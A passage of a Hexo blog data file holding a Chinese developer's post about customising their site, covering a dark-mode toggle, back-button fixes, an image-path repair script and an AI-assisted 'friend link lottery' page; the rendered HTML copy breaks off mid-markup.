<details><summary>提示词</summary>我想给我的博客写一个“友链抽奖机”，有一张类似牌的元素初始展示背面，点击后3D快速旋转，每转一圈随机一个友链（包括方形图片+大字名称+小字描述+加粗网址），每个友链有几种不同“品质”随机出现，用不同背景、前景色效果展示（比如默认、蓝、绿、金、红），旋转由快到慢，最后停在某个品质的友链上后就向localStorage存储一下，记录抽到了哪些友链及品质，再写一个展示抽到的友链的页面，以友链 分，显示抽到的最高品质的颜色，点击后弹出浮层，显示友链详情和抽到过的品质列表及数量，未抽中的留灰色占位，最后给出一个作弊按钮用来一键解锁所有基础友链。友链数据记录在JS对象中，可能随时间更改，编写代码时请注意这一点</details>\n* [V2](/friends/draft/ds_v2.html) -> 让D老师接受我的“现代”审美，至少AI味没有那么大了\n  <details><summary>提示词</summary>我想给我的博客写一个“友链抽奖机”，有一张类似牌的元素初始展示背面，点击后3D快速旋转，每转一圈随机一个友链（包括方形图片+大字名称+小字描述+加粗网址），每个友链都有五种不同“品质”随机出现，用不同背景、前景色效果展示（比如默认、绿、蓝、金、红），旋转由快匀速变慢，每次背面朝外时随机刷新背面的友链和品质，最后停在某个品质的友链上后就向localStorage存储一下，记录抽到了哪些友链及品质，再写一个展示抽到的友链的页面，以友链分，显示与抽取的卡片类似，颜色选抽到的最高品质的颜色，未抽中则为灰色，并显示？？？，根据品质、数量降序排列，并有各品质收集进度，有复选框来决定是否显示未抽中的，有一个搜索的功能（未抽中的也按名称参与，但仍显示？？？），给出一个作弊按钮“一键解锁”用来给未抽中过的友链添加一个普通品质，添加导入导出功能。最后给出一个danger的删除数据按钮。友链数据记录在JS对象中，可能随时间更改，编写代码时请注意这一点。尽可能用默认值来兼容上下文样式，并且除了卡牌、品质等适合使用圆角矩形的地方，尽可能采用尖角矩形、非渐变，按钮强调下缘的简约风格</details>\n* [V3](/friends/draft/ds_v3.html) -> 从V2的提示词进一步修改，最终版就是从这版上改的\n  <details><summary>提示词</summary>我想给我的博客写一个“友链抽奖机”，有一张类似牌的元素初始展示背面，点击后3D快速旋转，每转一圈随机一个友链（包括方形图片+大字名称+小字描述+加粗网址），每个友链都有五种不同“品质”随机出现，用不同背景、前景色效果展示（比如默认、绿、蓝、金、红），旋转由快匀速变慢，每次背面朝外时随机刷新背面的友链和品质，用JS实现，最后停在某个品质的友链上后就向localStorage存储一下，记录抽到了哪些友链及品质，再写一个展示抽到的友链的页面，以友链分，显示与抽取的卡片类似，颜色选抽到的最高品质的颜色，未抽中则为灰色，并显示？？？，根据品质、数量降序排列，并有各品质收集进度，有复选框来决定是否显示未抽中的，有一个搜索的功能（未抽中的也按名称参与，但仍显示？？？），给出一个作弊按钮“一键解锁”用来给未抽中过的友链添加一个普通品质，添加导入导出功能，点击后弹出浮层，左侧是较大的头像，右上是标题、说明、链接，若超出则显示滚动条，右下留一小条背景稍不同，用倾斜圆角矩形和对应颜色表示某种品质的牌，矩形里数字代表抽到的次数（注意2位数以上字体大小），若未抽到对应品质则背景为灰色、标0，矩形下方给出品质名称，注意间距。最后给出一个danger的删除数据按钮。友链数据记录在JS对象中，可能随时间更改，编写代码时请注意这一点。两个页面写在一起。我像把它加到已有的界面中，尽可能用默认值来兼容上下文样式，并且除了卡牌、品质等适合使用圆角矩形的地方，尽可能采用尖角矩形、非渐变，按钮强调下缘的简约风格</details>\n\n基于V3，通过反复向D老师提要求+自己修，慢慢地完成了这个“浩大工程”\n\n![alt text](image-5.png)\n\n（完全想象不出来自己写这么大托需要多久，我上一个纯手写的HTML前端只有798行41297字符）\n\n不过D老师还不是万能的，比如旋转动画写不出来，偶尔听不懂人话（不过不排除是上下文过大导致的），最后修改还得是我来做\n\n<span style=\"background-color: currentColor\">听说GPT、Gemini效果很好，不知道长城外的AI怎么样呢？</span>\n\n### 进一步改进“友链抽奖机”\n\n突然想到会不会有人把博客名字和介绍写的特别特别长，添加了截断，并且让友链详情的url会自动滚动了！\n\n然后还加入了友链消失和上新提示，加了一个友链全收集提示\n\n还加了体力全恢复的时间和对应的时刻\n\n啊吧啊吧啊吧……\n\n<script>\n    // 修复图炸的情况\n    (new Array(...document.getElementsByTagName('img'))).forEach(\n        img=>{\n            if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n                console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n                img.src=img.src.split('/').slice(-1)\n            }\n    })\n</script>","source":"_posts/小站修补琐记.md","raw":"---\ntitle: 小站修补琐记\ndate: 2025-11-04 19:35:35\ntags:\n---\n\n因为自己非常追求细节，同时也想分享一下开发过程中的琐事与技巧，特此设立“小站修补琐记”板块，持续更新！\n\n## 2025.10 + 2025.11\n\n### 明暗切换\n\nCactus模板内置了几种颜色主题，但是只能通过配置文件切换，不能动态切换。\n\n动态切换明暗的核心是通过对`html`元素（或者`body`元素）添加如`light`/`dark`这样的class，再在CSS分别写入对应的颜色等规则完成的\n\n经过观察，CSS使用[Stylus](https://stylus-lang.com/)编译，颜色被放在了`themes/cactus/css/_color`下的各个文件里，以变量形式存储，而Stylus支持[块级导入](https://stylus-lang.com/docs/import.html#block-level-import)，所以，我们可以把导入从这样\n\n```stylus\n@import \"_colors/\" + $colors\n```\n\n写成\n\n```stylus\n.light\n    @import \"_colors/\" + $colors-light\n.night\n    @import \"_colors/\" + $colors-night\n```\n\n而`$colors`这个变量在`$_variables.styl`里面定义，进行相应修改即可\n\n但仅仅这样在编译的时候会报错，原因是在CSS的定义中用到了`darken`之类的函数，这些函数会在编译时执行，然后硬编码进生成的.css文件中，然而块级定义导致这些变量没有明确的值，无法执行函数，故报错终止。\n\n最好的办法就是将这些定义的`.light`/`.night`分开定义，比如，把下面的\n\n```stylus\n*::-webkit-scrollbar-thumb:active\n  background-color: darken($color-scrollbar, 30%)\n```\n\n写成\n\n```stylus\n*::-webkit-scrollbar-thumb:active\n  .night &\n    background-color: darken($color-scrollbar, 30%)\n  .light &\n    background-color: darken($color-scrollbar, 30%)\n```\n\n但是我不保证这种方法的可行性，因为我一开始不知道Stylus可以块级导入，就手动把所有的变量加上`-light-`/`-dark-`中缀，并将颜色直接硬编码在`style.styl`里面（所以才说拉了坨大的，而且有一大堆漏的）\n\n然后就是增加切换按钮和持久化存储功能，这里通过修改模板`layout.ejs`实现\n\n在`head.ejs`里面添加一段JavaScript，用于切换主题\n\n```javascript\ncolorScheme = localStorage.getItem('color-scheme') || (matchMedia('(prefers-color-scheme: dark)').matches?\"night\":\"light\")\nif(colorScheme===\"light\"){\n    let classlist = document.querySelector(\"html\").classList\n    classlist.remove('night')\n    classlist.add('light')\n}\n```\n\n先尝试从`localStorage`里面读取是否已有主题，如果没有，就根据媒体查询同步浏览器主题。为了防止JS莫名其妙的炸掉，在`html`上加了`.night`，所以如果选择亮主题的话就要切换。\n\n然后是切换按钮，在`layout.ejs`的`body`下面添加\n\n```html\n<div style=\"position: fixed; right: 0; bottom: 0; z-index: 999; margin: 10px;\">\n    <button id=\"sun\" style=\"border: none; background: none; color:white; cursor: pointer;\" onclick=\"switchColorScheme('light')\"><svg style=\"width: 25px; height: 25px;\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\"><path fill=\"none\" d=\"M0 0h24v24H0z\"></path><path d=\"M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z\"></path></svg></button>\n    <button id=\"moon\" style=\"border: none; background: none; color: black; cursor: pointer;\" onclick=\"switchColorScheme('night')\"><svg style=\"width: 25px; height: 25px;\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\"><path fill=\"none\" d=\"M0 0h24v24H0z\"></path><path d=\"M11.3807 2.01886C9.91573 3.38768 9 5.3369 9 7.49999C9 11.6421 12.3579 15 16.5 15C18.6631 15 20.6123 14.0843 21.9811 12.6193C21.6613 17.8537 17.3149 22 12 22C6.47715 22 2 17.5228 2 12C2 6.68514 6.14629 2.33869 11.3807 2.01886Z\"></path></svg></button>\n</div>\n```\n\n在里面的图标是从[这个网站](https://remixicon.com/)复制的矢量图\n\n以及切换逻辑\n\n```javascript\ncolorScheme = localStorage.getItem('color-scheme') || (matchMedia('(prefers-color-scheme: dark)').matches?\"night\":\"light\")\nif(colorScheme==='light'){\n    document.getElementById(\"sun\").style.display = \"none\"\n    document.getElementById(\"moon\").style.display = \"\"\n}else{\n    document.getElementById(\"sun\").style.display = \"\"\n    document.getElementById(\"moon\").style.display = \"none\"\n}\nfunction switchColorScheme(scheme){\n    localStorage.setItem(\"color-scheme\", scheme)\n    if(scheme==='light'){\n        document.getElementById(\"sun\").style.display = \"none\"\n        document.getElementById(\"moon\").style.display = \"\"\n        let classlist = document.querySelector(\"html\").classList\n        classlist.remove('night')\n        classlist.add('light')\n    }else{\n        document.getElementById(\"sun\").style.display = \"\"\n        document.getElementById(\"moon\").style.display = \"none\"\n        let classlist = document.querySelector(\"html\").classList\n        classlist.add('night')\n        classlist.remove('light')\n    }\n}\n```\n\n接下来就可以自如切换啦~\n\n### 返回按钮\n\n~~有一点小瑕疵，因为我加的返回按钮是通过`history.go(-1)`实现的，所以在这里切换主题后通过返回按钮返回后需要刷新才会生效，并且在通过目录跳转过的情况下这个按钮会返回上一个锚点，而不是上一个界面。~~  \n已修复，现在返回按钮通过`location.href = document.referrer || '/'`实现（但还是有bug，如果从一篇文章跳到另一篇，用返回键就会来回跳转，或许应该用`SessionStorage`？）\n\n### 左上角的博客名称\n\n最开始是没想适配手机的，但是后面还是适配了\n\n添加没什么，主要讲讲如何适配\n\n首先，在电脑这种大地方，在左上角显示并不多余，而在手机的首页和关于页等地，有一个博客名称，故在这些页隐藏；在文章页，屏幕比较窄的话图标会和字重叠，干脆显示成一整行，中间有一个过渡态，就是刚刚穿过文字显示边界的时候，和“返回”按钮挨得特别近，不好看，就让它挨着左上角了\n\n![](GIF%202025-11-4%2020-49-48.gif)\n\n![](GIF%202025-11-4%2020-50-19.gif)\n\n其实对右边那个工具栏我也有修改，让它翻下去不会消失，但是页面变窄之后会和左上角的重合，就是以此分界过渡态和横条状态\n\n```css\n// is_post() 时\n@media screen and (max-width: 1468px) { // 过渡态\n    .hide-on-phone{\n        margin: 0px !important;\n        border-bottom-left-radius: 0px !important;\n        border-top-right-radius: 0px !important;\n        border-top: none !important;\n        border-left: none !important;\n    }\n}\n@media screen and (max-width: 630px) { // 横条状态\n    .hide-on-phone{\n        margin: 0 !important;\n        width: 100%;\n        border: none !important;\n        border-radius: 0 !important;\n        border-bottom: gray 1px solid !important;\n    }\n}\n\n// !is_post() 时\n@media screen and (max-width: 1468px) { // 直接隐藏\n    .hide-on-phone{\n        display: none !important;\n    }\n}\n```\n\n### 随机学校\n\n这个是一个很简单的JavaScript动态界面，每次会用`Math.floor(Math.random()*3)`生成随机数`0`/`1`/`2`，然后用`document.getElementById(...).innerText = ...`完成动态修改\n\n并且为了~~防止小孩误食~~防止真的有人去报考<span style=\"text-decoration: underline wavy red;\" title=\"这是《人民日报》报道过的“野鸡大学”\" onclick=\"alert('我说没有就没有！')\">中国邮电大学</span><sup><a id=\"baikePortal\" href=\"https://baike.baidu.com/item/%E4%B8%AD%E5%9B%BD%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/7527114\">百度百科传送门</a></sup>，更新加上了红色波浪线警示，并且将鼠标放置在其上时会显示提示（前面的这个也有），并且可以点击刷新（前面的没有），并且人性化地考虑到一顿狂点可能会被选中而影响美观，特意添加了`user-select: none`（前面那个也没有）\n\n<style>\n    .light #baikePortal {\n        color: blue;\n    }\n    .night #baikePortal {\n        color: lightblue;\n    }\n</style>\n\n```html\n......目前就读于<span id=\"studyIn\" style=\"text-decoration: underline wavy red; cursor: pointer; user-select: none;\" title=\"Not Truth\"></span>......\n\n<script>\n    studyIn = [\"北京邮电学院\", \"中国邮电大学\", \"北京等通知大学\"]\n    randomStudyIn = ()=>{document.getElementById(\"studyIn\").innerText = studyIn[Math.floor(Math.random()*3)]}\n    randomStudyIn()\n    document.getElementById(\"studyIn\").addEventListener(\"click\", randomStudyIn)\n</script>\n```\n\n### 图裂修复\n\n这个似乎是hexo的特性，网上的解决方法好像都要额外下载内容，我就不！反正图片已经被移动到正确的地方了，那我就写一个JavaScript修复就是了嘛\n\n就目前而言一切正常，可以放心食用\n\n```javascript\n// 修复图炸的情况\n(new Array(...document.getElementsByTagName('img'))).forEach(\n    img=>{\n        if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n            console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n            img.src=img.src.split('/').slice(-1)\n        }\n})\n```\n\n前面的提示的路径也是动态生成的\n\n又小小的更新一下（2026-1-3），加了一个`decodeURI`解码`%xx`，使log更像人类（bushi\n\n```markdown\n> 不知道为什么图片路径可能会炸掉，在最后面写了一个简易的修复代码，不能保证一定有用\n> \n> 如果图炸了的话请手动拼接URL，为\n>\n> <span id=\"urlNow\"></span>image-编号.png\n\n<script>\n  document.getElementById(\"urlNow\").innerText = location.href.split('#')[0]\n  document.getElementById(\"urlNow\").innerText += location.href.split('#')[0].slice(-1)==='/'?'':'/'\n</script>\n```\n\n至于为什么是`image-编号.png`，是因为在VSCode的Markdown编辑器里粘贴图片的默认命名就是这个，还是要以实际为准\n\n## 2026.1\n\n### back按钮\n\n突然想捣腾一下小站了，把back按钮使用sessionStorage存储，这下不至于在同一页的锚点上来回跳了，\n但是这样的操作成功地往浏览器自己的History里面拉了一坨大的：每次点back会被认为是一次“新页面”\n\n综合考虑下，打算给自己的网页加一个FeatureConfig页\n\n### FeatureConfig页\n\n说搞就搞！\n\n首先在首页加一个Feature按钮，找到面包条在`_partial/header.ejs`里生成\n\n![](image0.png)\n\n面包条的内容来源于theme的config，进去修改，并且__应该是翻译函数，所以为了用不到的i18n，改一下对应翻译的内容\n\n![](image.png)\n\n![](image-1.png)\n\n![](image-2.png)\n\n然后`hexo g && hexo s`一下看看效果\n\n![](image-3.png)\n\n![](image-4.png)\n\n好！接下来就是添加可选的特性了！\n\n特性依旧使用localStorage存储\n\n先来一个`localStorage`检测\n\n```html\n<p id=\"support-storage\" class=\"unknow\">正在检测你的浏览器是否支持localStorage……🔎</p>\n\n<style>\n    .unknow{\n        border: 1px hsla(54, 88%, 24%, 1.00) solid;\n        color: hsla(54, 88%, 24%, 1.00);\n        background-color: hsla(54, 90%, 85%, 1.00);\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n    .support{\n        border: 1px #077207 solid;\n        color: #077207;\n        background-color: #b4fbb4;\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n    .unsupport{\n        border: 1px #720707 solid;\n        color: #720707;\n        background-color: #fbb4b4;\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n</style>\n\n<script>\n    function test(){\n        try{\n            localStorage.setItem('test', 'ok');\n            var result = localStorage.getItem('test') == 'ok';\n            localStorage.removeItem('test');\n            return result;\n        }catch(error){\n            console.error(error);\n            return false;\n        }\n    }\n    let result = test();\n    document.getElementById('support-storage').classList.remove('unknow')\n    if(result){\n        document.getElementById('support-storage').innerText = '你的浏览器支持localStorage！🎉🎉🎉'\n        document.getElementById('support-storage').classList.add('support')\n    }else{\n        document.getElementById('support-storage').innerText = '你的浏览器好像不支持localStorage！🤔'\n        document.getElementById('support-storage').classList.add('unsupport')\n    }\n</script>\n```\n\n然后加上各部分的代码……（有点多，不放了）\n\n一通倒腾，搞定了~ [修改特性传送门](/features/)\n\n并且为了方便，加了个toc属性，通过`layout.ejs`里面判断`page.toc`是否为真来强制显示toc\n\n希望不要有bug\n\n### 给图片加边框\n\n从背景相似的地方截图根本看不清边界，给所有图片加了一个边框~\n\n### 修复了一些之前产的史\n\n如题，发现于原版Cactus有点不一样，经查发现`.light selector`无法生效，需替换成\n```stylus\nselector\n    .light &\n        ...\n```\n\n并且将desktop版的nav改回了仅在顶部附近显示（这里我发现阈值过小，导致无法重新显示，于是调大了阈值，并且在已经写了这么多NativeJS的情况下发现他竟然有jQuery……）\n\n### 上线“友链抽奖机”\n\n~~虽然一个友链都没有~~ ，但是“友链抽奖机”终于写完了！\n\n这个抽奖机拥抱AI，因为我实在不想写前端了！用的D老师，效果还不错~\n\n快去[抽友链](/friends/)吧！\n\n对了，把D老师之前几版也放一下，下面的都是D老师根据提示词自己写出来的~\n\n<style>\n    details {\n        border: 1px solid;\n        padding: 5px;\n        border-radius: 5px;\n    }\n\n    details:open summary {\n        border-bottom: 1px solid;\n    }\n</style>\n\n* [V1](/friends/draft/ds_v1.html) -> 最原始的简单提示词，看起来不错，就是AI味太大了\n  <details><summary>提示词</summary>我想给我的博客写一个“友链抽奖机”，有一张类似牌的元素初始展示背面，点击后3D快速旋转，每转一圈随机一个友链（包括方形图片+大字名称+小字描述+加粗网址），每个友链有几种不同“品质”随机出现，用不同背景、前景色效果展示（比如默认、蓝、绿、金、红），旋转由快到慢，最后停在某个品质的友链上后就向localStorage存储一下，记录抽到了哪些友链及品质，再写一个展示抽到的友链的页面，以友链 分，显示抽到的最高品质的颜色，点击后弹出浮层，显示友链详情和抽到过的品质列表及数量，未抽中的留灰色占位，最后给出一个作弊按钮用来一键解锁所有基础友链。友链数据记录在JS对象中，可能随时间更改，编写代码时请注意这一点</details>\n* [V2](/friends/draft/ds_v2.html) -> 让D老师接受我的“现代”审美，至少AI味没有那么大了\n  <details><summary>提示词</summary>我想给我的博客写一个“友链抽奖机”，有一张类似牌的元素初始展示背面，点击后3D快速旋转，每转一圈随机一个友链（包括方形图片+大字名称+小字描述+加粗网址），每个友链都有五种不同“品质”随机出现，用不同背景、前景色效果展示（比如默认、绿、蓝、金、红），旋转由快匀速变慢，每次背面朝外时随机刷新背面的友链和品质，最后停在某个品质的友链上后就向localStorage存储一下，记录抽到了哪些友链及品质，再写一个展示抽到的友链的页面，以友链分，显示与抽取的卡片类似，颜色选抽到的最高品质的颜色，未抽中则为灰色，并显示？？？，根据品质、数量降序排列，并有各品质收集进度，有复选框来决定是否显示未抽中的，有一个搜索的功能（未抽中的也按名称参与，但仍显示？？？），给出一个作弊按钮“一键解锁”用来给未抽中过的友链添加一个普通品质，添加导入导出功能。最后给出一个danger的删除数据按钮。友链数据记录在JS对象中，可能随时间更改，编写代码时请注意这一点。尽可能用默认值来兼容上下文样式，并且除了卡牌、品质等适合使用圆角矩形的地方，尽可能采用尖角矩形、非渐变，按钮强调下缘的简约风格</details>\n* [V3](/friends/draft/ds_v3.html) -> 从V2的提示词进一步修改，最终版就是从这版上改的\n  <details><summary>提示词</summary>我想给我的博客写一个“友链抽奖机”，有一张类似牌的元素初始展示背面，点击后3D快速旋转，每转一圈随机一个友链（包括方形图片+大字名称+小字描述+加粗网址），每个友链都有五种不同“品质”随机出现，用不同背景、前景色效果展示（比如默认、绿、蓝、金、红），旋转由快匀速变慢，每次背面朝外时随机刷新背面的友链和品质，用JS实现，最后停在某个品质的友链上后就向localStorage存储一下，记录抽到了哪些友链及品质，再写一个展示抽到的友链的页面，以友链分，显示与抽取的卡片类似，颜色选抽到的最高品质的颜色，未抽中则为灰色，并显示？？？，根据品质、数量降序排列，并有各品质收集进度，有复选框来决定是否显示未抽中的，有一个搜索的功能（未抽中的也按名称参与，但仍显示？？？），给出一个作弊按钮“一键解锁”用来给未抽中过的友链添加一个普通品质，添加导入导出功能，点击后弹出浮层，左侧是较大的头像，右上是标题、说明、链接，若超出则显示滚动条，右下留一小条背景稍不同，用倾斜圆角矩形和对应颜色表示某种品质的牌，矩形里数字代表抽到的次数（注意2位数以上字体大小），若未抽到对应品质则背景为灰色、标0，矩形下方给出品质名称，注意间距。最后给出一个danger的删除数据按钮。友链数据记录在JS对象中，可能随时间更改，编写代码时请注意这一点。两个页面写在一起。我像把它加到已有的界面中，尽可能用默认值来兼容上下文样式，并且除了卡牌、品质等适合使用圆角矩形的地方，尽可能采用尖角矩形、非渐变，按钮强调下缘的简约风格</details>\n\n基于V3，通过反复向D老师提要求+自己修，慢慢地完成了这个“浩大工程”\n\n![alt text](image-5.png)\n\n（完全想象不出来自己写这么大托需要多久，我上一个纯手写的HTML前端只有798行41297字符）\n\n不过D老师还不是万能的，比如旋转动画写不出来，偶尔听不懂人话（不过不排除是上下文过大导致的），最后修改还得是我来做\n\n<span style=\"background-color: currentColor\">听说GPT、Gemini效果很好，不知道长城外的AI怎么样呢？</span>\n\n### 进一步改进“友链抽奖机”\n\n突然想到会不会有人把博客名字和介绍写的特别特别长，添加了截断，并且让友链详情的url会自动滚动了！\n\n然后还加入了友链消失和上新提示，加了一个友链全收集提示\n\n还加了体力全恢复的时间和对应的时刻\n\n啊吧啊吧啊吧……\n\n<script>\n    // 修复图炸的情况\n    (new Array(...document.getElementsByTagName('img'))).forEach(\n        img=>{\n            if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n                console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n                img.src=img.src.split('/').slice(-1)\n            }\n    })\n</script>","slug":"小站修补琐记","published":1,"updated":"2026-01-11T12:18:04.218Z","comments":1,"layout":"post","photos":[],"_id":"cmk9p9p3t0007h4vbbfq99hxi","content":"<p>因为自己非常追求细节，同时也想分享一下开发过程中的琐事与技巧，特此设立“小站修补琐记”板块，持续更新！</p>\n<h2 id=\"2025-10-2025-11\"><a href=\"#2025-10-2025-11\" class=\"headerlink\" title=\"2025.10 + 2025.11\"></a>2025.10 + 2025.11</h2><h3 id=\"明暗切换\"><a href=\"#明暗切换\" class=\"headerlink\" title=\"明暗切换\"></a>明暗切换</h3><p>Cactus模板内置了几种颜色主题，但是只能通过配置文件切换，不能动态切换。</p>\n<p>动态切换明暗的核心是通过对<code>html</code>元素（或者<code>body</code>元素）添加如<code>light</code>&#x2F;<code>dark</code>这样的class，再在CSS分别写入对应的颜色等规则完成的</p>\n<p>经过观察，CSS使用<a href=\"https://stylus-lang.com/\">Stylus</a>编译，颜色被放在了<code>themes/cactus/css/_color</code>下的各个文件里，以变量形式存储，而Stylus支持<a href=\"https://stylus-lang.com/docs/import.html#block-level-import\">块级导入</a>，所以，我们可以把导入从这样</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">@import</span> <span class=\"string\">&quot;_colors/&quot;</span> + <span class=\"variable\">$colors</span></span><br></pre></td></tr></table></figure>\n\n<p>写成</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.light</span></span><br><span class=\"line\">    <span class=\"keyword\">@import</span> <span class=\"string\">&quot;_colors/&quot;</span> + <span class=\"variable\">$colors</span>-light</span><br><span class=\"line\"><span class=\"selector-class\">.night</span></span><br><span class=\"line\">    <span class=\"keyword\">@import</span> <span class=\"string\">&quot;_colors/&quot;</span> + <span class=\"variable\">$colors</span>-night</span><br></pre></td></tr></table></figure>\n\n<p>而<code>$colors</code>这个变量在<code>$_variables.styl</code>里面定义，进行相应修改即可</p>\n<p>但仅仅这样在编译的时候会报错，原因是在CSS的定义中用到了<code>darken</code>之类的函数，这些函数会在编译时执行，然后硬编码进生成的.css文件中，然而块级定义导致这些变量没有明确的值，无法执行函数，故报错终止。</p>\n<p>最好的办法就是将这些定义的<code>.light</code>&#x2F;<code>.night</code>分开定义，比如，把下面的</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*::-webkit-scrollbar-thumb<span class=\"selector-pseudo\">:active</span></span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"built_in\">darken</span>(<span class=\"variable\">$color</span>-scrollbar, <span class=\"number\">30%</span>)</span><br></pre></td></tr></table></figure>\n\n<p>写成</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*::-webkit-scrollbar-thumb<span class=\"selector-pseudo\">:active</span></span><br><span class=\"line\">  <span class=\"selector-class\">.night</span> &amp;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"built_in\">darken</span>(<span class=\"variable\">$color</span>-scrollbar, <span class=\"number\">30%</span>)</span><br><span class=\"line\">  <span class=\"selector-class\">.light</span> &amp;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"built_in\">darken</span>(<span class=\"variable\">$color</span>-scrollbar, <span class=\"number\">30%</span>)</span><br></pre></td></tr></table></figure>\n\n<p>但是我不保证这种方法的可行性，因为我一开始不知道Stylus可以块级导入，就手动把所有的变量加上<code>-light-</code>&#x2F;<code>-dark-</code>中缀，并将颜色直接硬编码在<code>style.styl</code>里面（所以才说拉了坨大的，而且有一大堆漏的）</p>\n<p>然后就是增加切换按钮和持久化存储功能，这里通过修改模板<code>layout.ejs</code>实现</p>\n<p>在<code>head.ejs</code>里面添加一段JavaScript，用于切换主题</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">colorScheme = <span class=\"variable language_\">localStorage</span>.<span class=\"title function_\">getItem</span>(<span class=\"string\">&#x27;color-scheme&#x27;</span>) || (<span class=\"title function_\">matchMedia</span>(<span class=\"string\">&#x27;(prefers-color-scheme: dark)&#x27;</span>).<span class=\"property\">matches</span>?<span class=\"string\">&quot;night&quot;</span>:<span class=\"string\">&quot;light&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span>(colorScheme===<span class=\"string\">&quot;light&quot;</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> classlist = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&quot;html&quot;</span>).<span class=\"property\">classList</span></span><br><span class=\"line\">    classlist.<span class=\"title function_\">remove</span>(<span class=\"string\">&#x27;night&#x27;</span>)</span><br><span class=\"line\">    classlist.<span class=\"title function_\">add</span>(<span class=\"string\">&#x27;light&#x27;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>先尝试从<code>localStorage</code>里面读取是否已有主题，如果没有，就根据媒体查询同步浏览器主题。为了防止JS莫名其妙的炸掉，在<code>html</code>上加了<code>.night</code>，所以如果选择亮主题的话就要切换。</p>\n<p>然后是切换按钮，在<code>layout.ejs</code>的<code>body</code>下面添加</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;position: fixed; right: 0; bottom: 0; z-index: 999; margin: 10px;&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;sun&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: none; background: none; color:white; cursor: pointer;&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;switchColorScheme(&#x27;light&#x27;)&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;width: 25px; height: 25px;&quot;</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"attr\">viewBox</span>=<span class=\"string\">&quot;0 0 24 24&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;currentColor&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;none&quot;</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M0 0h24v24H0z&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">path</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 